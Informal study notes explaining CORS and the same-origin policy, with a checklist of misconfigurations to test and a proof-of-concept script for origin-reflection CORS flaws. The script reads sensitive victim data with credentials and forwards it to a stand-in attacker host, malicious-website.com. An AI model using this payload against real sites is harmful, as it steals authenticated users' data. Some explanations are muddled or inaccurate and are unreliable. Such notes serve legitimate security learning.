

CORS is a security mechanism enforced by browsers to control how web applications running on one **origin (domain, protocol, port)** can interact with resources from another origin.


A **same-origin** policy mandates that a **server requesting** a resource and the server hosting the **resource** share

- the same protocol (e.g., `http://`), 
- domain name (e.g., `internal-web.com`), 
- **port** (e.g., 80). 

basically lets say there is BOB that is authenticated in a page and we send a link that is as simple as http request to a specific page to send it to another domain like collab if CORS is configured well it wouldn't send it if it isnt it will send it 

Under this policy, only web pages from the same domain and port are allowed access to the resources. meaning that resources are shared from the same domain , protocol and port can access the resources

If `https://example.com` tries to fetch data from `https://api.example.com`, the browser checks if `api.example.com` allows requests from `example.com` via CORS headers.



## CheckList



- [ ] multiple origins  
- [ ] null
- [ ] wildcard * 
- [ ] `http://trusted-subdomain.vulnerable-website.com`




### CORS vulnerability with basic origin reflection

```js
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='//malicious-website.com/log?key='+this.responseText; };
</script>
```